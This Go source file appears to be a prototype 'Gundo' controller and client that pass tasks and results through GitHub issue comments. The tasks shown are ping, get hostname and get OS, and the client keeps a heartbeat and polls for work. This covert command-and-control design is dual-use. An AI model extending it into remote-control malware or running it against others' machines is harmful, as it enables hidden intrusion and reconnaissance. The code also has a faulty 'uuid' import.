// package main

// import "fmt"

// func main() {

// 	fmt.Println("=== Gundo Controller Demo ===")

// 	// 1. Create agent mailbox
// 	issue := IssueRequest{
// 		Title: "Gundo Agent Mailbox",
// 		Body:  "Mailbox used for Gundo controller/agent communication.",
// 	}

// 	createdIssue, err := createIssue(issue)
// 	if err != nil {
// 		fmt.Printf("Error creating issue: %v\n", err)
// 		return
// 	}

// 	fmt.Printf(
// 		"[+] Mailbox created: Issue #%d\n",
// 		createdIssue.Number,
// 	)

// 	// 2. Create structured Gundo task
// 	task := createTaskMessage("get_hostname")

// 	fmt.Printf(
// 		"[+] Task created: %s\n",
// 		task.TaskID,
// 	)

// 	// 3. Send task through GitHub comment transport
// 	err = createComment(createdIssue.Number, task)
// 	if err != nil {
// 		fmt.Printf("Error creating task comment: %v\n", err)
// 		return
// 	}

// 	fmt.Println("[+] Task posted to GitHub")

// 	// 4. Read comments back from GitHub
// 	comments, err := listComments(createdIssue.Number)
// 	if err != nil {
// 		fmt.Printf("Error listing comments: %v\n", err)
// 		return
// 	}

// 	if len(comments) == 0 {
// 		fmt.Println("No comments returned from GitHub.")
// 		return
// 	}

// 	// 5. Grab newest comment
// 	latestComment := comments[len(comments)-1]

// 	fmt.Printf(
// 		"[+] Received GitHub comment ID: %d\n",
// 		latestComment.ID,
// 	)

// 	// 6. Convert GitHub comment body back into Go
// 	message, err := parseGundoMessage(latestComment.Body)
// 	if err != nil {
// 		fmt.Printf("Error parsing Gundo message: %v\n", err)
// 		return
// 	}

// 	// poll not used in this itertion as this is just for one round trip sake

// 	// 7. Prove round trip
// 	fmt.Println("\n=== Parsed Gundo Message ===")
// 	fmt.Printf("Type:      %s\n", message.Type)
// 	fmt.Printf("Task ID:   %s\n", message.TaskID)
// 	fmt.Printf("Action:    %s\n", message.Action)
// 	fmt.Printf("Timestamp: %s\n", message.Timestamp)

// 	fmt.Println("\n[+] Controller round trip successful")
// }

package main

import (
	"bufio"
	"fmt"
	"os"
	"strings"
	"time"
	"uuid"
)

// setup a runclient + a runcontroller for testing purposes

func runClient() {
	var state ClientState

	savedState, err := loadState()

	if err == nil {
		state = savedState

		fmt.Printf("[+] Loaded existing client\n")
		fmt.Printf("[+] Client ID: %s\n", state.ClientID)
		fmt.Printf("[+] Mailbox: Issue #%d\n", state.IssueNumber)

	} else if os.IsNotExist(err) {

		fmt.Println("[+] First run detected")

		clientID := uuid.New().String()

		issue := IssueRequest{
			Title: "Gundo Client - " + clientID,
			Body:  "Gundo client mailbox",
		}

		createdIssue, err := createIssue(issue)
		if err != nil {
			fmt.Printf("Failed to create mailbox: %v\n", err)
			return
		}

		state = ClientState{
			ClientID:    clientID,
			IssueNumber: createdIssue.Number,
		}

		if err := saveState(state); err != nil {
			fmt.Printf("Failed to save client state: %v\n", err)
			return
		}

		fmt.Printf("[+] Created Client ID: %s\n", state.ClientID)
		fmt.Printf("[+] Created mailbox: Issue #%d\n", state.IssueNumber)

	} else {
		fmt.Printf("Failed to load state: %v\n", err)
		return
	}

	client := newClient(state.ClientID)

	// seperate go routine to run the heartbeast concurrent with poll tasks
	go client.heartbeatLoop(state.IssueNumber)

	client.pollTasks(state.IssueNumber)
}

// polling comments to poll comments and grab results
// CLI version of pollComments()
func waitForResult(issueNumber int, taskID string) (GundoMessage, error) {
	for {
		// grab comments
		comments, err := listComments(issueNumber)
		if err != nil {
			return GundoMessage{}, err
		}

		for _, comment := range comments {
			// parses comment into Gundo Struct to read and work with
			message, err := parseGundoMessage(comment.Body)
			if err != nil {
				continue
			}

			// We only care about result messages.
			if message.Type != "result" {
				continue
			}

			// We only want the result belonging to
			// the task the controller just sent.
			if message.TaskID != taskID {
				continue
			}

			return message, nil
		}

		time.Sleep(5 * time.Second)
	}
}

func runController() {
	// check for current state
	// heartbeats to be added to test things out on its own
	state, err := loadState()
	if err != nil {
		fmt.Printf("Failed to load client state: %v\n", err)
		return
	}

	// picks up from current state
	fmt.Println("=== Gundo Controller ===")
	fmt.Printf("[+] Client ID: %s\n", state.ClientID)
	fmt.Printf("[+] Mailbox: Issue #%d\n", state.IssueNumber)

	reader := bufio.NewReader(os.Stdin)

	for {
		fmt.Println("\n=== Commands ===")
		fmt.Println("1. Ping")
		fmt.Println("2. Get Hostname")
		fmt.Println("3. Get OS")
		fmt.Println("0. Exit")

		fmt.Print("\nSelect command: ")

		input, err := reader.ReadString('\n')
		if err != nil {
			fmt.Printf("Error reading command: %v\n", err)
			continue
		}

		choice := strings.TrimSpace(input)

		var action string

		switch choice {
		case "1":
			action = "ping"

		case "2":
			action = "get_hostname"

		case "3":
			action = "get_os"

		case "0":
			fmt.Println("Exiting controller.")
			return

		default:
			fmt.Println("Invalid command.")
			continue
		}

		// Create a new Gundo task based on the action
		task := createTaskMessage(action)

		// Target the client loaded from state.json.
		task.TargetClientID = state.ClientID

		fmt.Printf(
			"\n[+] Sending %s task\n",
			action,
		)

		fmt.Printf(
			"[+] Task ID: %s\n",
			task.TaskID,
		)

		// Send the task to this client's mailbox.
		err = createComment(state.IssueNumber, task)
		if err != nil {
			fmt.Printf("Error sending task: %v\n", err)
			continue
		}

		fmt.Println("[+] Task posted")
		fmt.Println("[+] Waiting for result...")

		// Wait specifically for this task's response.
		result, err := waitForResult(
			state.IssueNumber,
			task.TaskID,
		)

		if err != nil {
			fmt.Printf("Error waiting for result: %v\n", err)
			continue
		}

		fmt.Println("\n=== Result ===")
		fmt.Printf("Status: %s\n", result.Status)
		fmt.Printf("Output: %s\n", result.Output)
	}
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage:")
		fmt.Println("  go run . client")
		fmt.Println("  go run . controller")
		return
	}

	switch os.Args[1] {
	case "client":
		runClient()

	case "controller":
		runController()

	default:
		fmt.Println("Unknown mode:", os.Args[1])
	}
}
